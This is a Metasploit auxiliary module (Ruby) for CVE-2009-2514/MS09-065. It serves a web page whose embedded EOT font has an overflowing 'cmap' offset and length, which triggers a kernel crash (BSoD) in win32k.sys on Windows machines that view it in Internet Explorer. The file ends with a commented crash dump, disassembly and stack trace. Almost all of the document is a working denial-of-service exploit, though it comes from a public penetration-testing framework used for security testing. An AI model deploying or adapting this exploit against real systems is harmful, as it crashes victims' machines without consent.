##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft Windows EOT Font Table Directory Integer Overflow',
      'Description'    => %q{
        This module exploits an integer overflow flaw in the Microsoft Windows Embedded
      OpenType font parsing code located in win32k.sys. Since the kernel itself parses
      embedded web fonts, it is possible to trigger a BSoD from a normal web page when
      viewed with Internet Explorer.
      },
      'License'        => MSF_LICENSE,
      'Author'         => 'hdm',
      'References'     =>
        [
          [ 'CVE', '2009-2514' ],
          [ 'MSB', 'MS09-065' ],
          [ 'OSVDB', '59869']
        ],
      'DisclosureDate' => 'Nov 10 2009'
    ))
    register_options([
      OptPath.new('EOTFILE', [ true, "The EOT template to use to generate the trigger", File.join(Msf::Config.data_directory, "exploits", "pricedown.eot")]),
    ], self.class)

  end

  def run
    exploit
  end

  def on_request_uri(cli, request)
    @tag ||= Rex::Text.rand_text_alpha(8)
    @eot ||= ::File.read(datastore['EOTFILE'], ::File.size(datastore['EOTFILE']))

    if(request.uri =~ /#{@tag}$/)
      content = @eot.dup

      # Only this table entry seems to trigger the bug
      cidx = content.index('cmap')

      # Use an offset and a length that overflow when combined
      coff = 0xb0000000
      clen = (0xfffffffe - coff + 0xcc)

      # Patch in the modified offset and length values
      content[cidx + 8, 8] = [ coff, clen ].pack("N*")

      # Send the font on its merry way
      print_status("Sending embedded font...")
      send_response_html(cli, content, { 'Content-Type' => 'application/octet-stream' })
    else
      var_title = Rex::Text.rand_text_alpha(6 + rand(32))
      var_body = Rex::Text.rand_text_alpha(64 + rand(32))
      var_font = Rex::Text.rand_text_alpha(2 + rand(6))
      var_face = Rex::Text.rand_text_alpha(2 + rand(32))

      content = %Q|<html><head><title>#{var_title}</title><style type="text/css">
@font-face{ font-family: '#{var_face}';  src: url('#{get_resource}/#{var_font}#{@tag}'); }
body {
  font-family: '#{var_face}';
}
</style></head><body> #{var_body} </body></html>|

      print_status("Sending HTML page with embedded font...")
      send_response_html(cli, content, { 'Content-Type' => 'text/html' })
    end
  end
end

=begin

#
# Crash dump information
#

READ_ADDRESS:  b0f70072

FAULTING_IP:
win32k!bComputeIDs+28
bf87c9df 8a6702          mov     ah,byte ptr [edi+2]

MM_INTERNAL_CODE:  0

IMAGE_NAME:  win32k.sys

DEBUG_FLR_IMAGE_TIMESTAMP:  45f013f6

MODULE_NAME: win32k

FAULTING_MODULE: bf800000 win32k

DEFAULT_BUCKET_ID:  DRIVER_FAULT

BUGCHECK_STR:  0x50

PROCESS_NAME:  csrss.exe

TRAP_FRAME:  b22192e8 -- (.trap 0xffffffffb22192e8)
ErrCode = 00000000
eax=00000000 ebx=00000000 ecx=500000ca edx=00f70010 esi=b22198d8 edi=b0f70070
eip=bf87c9df esp=b221935c ebp=b2219374 iopl=0         nv up ei pl nz na pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010206
win32k!bComputeIDs+0x28:
bf87c9df 8a6702          mov     ah,byte ptr [edi+2]        ds:0023:b0f70072=??
Resetting default scope

LAST_CONTROL_TRANSFER:  from 804f79d7 to 80526fc8

STACK_TEXT:
b2218e24 804f79d7 00000003 b0f70072 00000000 nt!RtlpBreakWithStatusInstruction
b2218e70 804f85c4 00000003 00000000 c0587b80 nt!KiBugCheckDebugBreak+0x19
b2219250 804f8aef 00000050 b0f70072 00000000 nt!KeBugCheck2+0x574
b2219270 8051c0d3 00000050 b0f70072 00000000 nt!KeBugCheckEx+0x1b
b22192d0 8053f90c 00000000 b0f70072 00000000 nt!MmAccessFault+0x8e7
b22192d0 bf87c9df 00000000 b0f70072 00000000 nt!KiTrap0E+0xcc
b2219374 bf87a391 00f70010 b22198d8 b2219a76 win32k!bComputeIDs+0x28
b22193a8 bf87a02b 00f70010 00004d18 00000000 win32k!bVerifyTTF+0xe1
b2219a68 bf879f0e e234b668 00f70010 00004d18 win32k!bLoadTTF+0x7c
b2219af0 bf879e48 e234b668 00f70010 00004d18 win32k!bLoadFontFile+0x228
b2219b40 bf879911 00000001 e234b660 b2219bf0 win32k!ttfdSemLoadFontFile+0x4c
b2219b70 bf87989f 00000001 e234b660 b2219bf0 win32k!PDEVOBJ::LoadFontFile+0x3a
b2219ba8 bf96370c 00000000 00000000 e234b660 win32k!vLoadFontFileView+0x12b
b2219c5c bf93eda9 e234b660 00000000 00000000 win32k!PUBLIC_PFTOBJ::hLoadMemFonts+0x6a
b2219cb4 bf9488e4 00f70000 e10ff0b0 00000000 win32k!GreAddFontMemResourceEx+0x76
b2219d48 8053ca28 0297cc48 00004d18 00000000 win32k!NtGdiAddFontMemResourceEx+0xb0
b2219d48 7c90eb94 0297cc48 00004d18 00000000 nt!KiFastCallEntry+0xf8
0172f6dc 00000000 00000000 00000000 00000000 ntdll!KiFastSystemCallRet

win32k!bComputeIDs:
bf87c9b7 8bff            mov     edi,edi
bf87c9b9 55              push    ebp
bf87c9ba 8bec            mov     ebp,esp
bf87c9bc 83ec10          sub     esp,10h
bf87c9bf 8b450c          mov     eax,dword ptr [ebp+0Ch]
bf87c9c2 8b4804          mov     ecx,dword ptr [eax+4]
bf87c9c5 53              push    ebx
bf87c9c6 57              push    edi
bf87c9c7 8b38            mov     edi,dword ptr [eax]
bf87c9c9 037d08          add     edi,dword ptr [ebp+8]
bf87c9cc 33db            xor     ebx,ebx
bf87c9ce 33c0            xor     eax,eax
bf87c9d0 83f904          cmp     ecx,4
bf87c9d3 895df8          mov     dword ptr [ebp-8],ebx
bf87c9d6 894dfc          mov     dword ptr [ebp-4],ecx
bf87c9d9 0f82cf000000    jb      win32k!bComputeIDs+0x1be (bf87caae)
bf87c9df 8a6702          mov     ah,byte ptr [edi+2]  <--- the crash above

=end
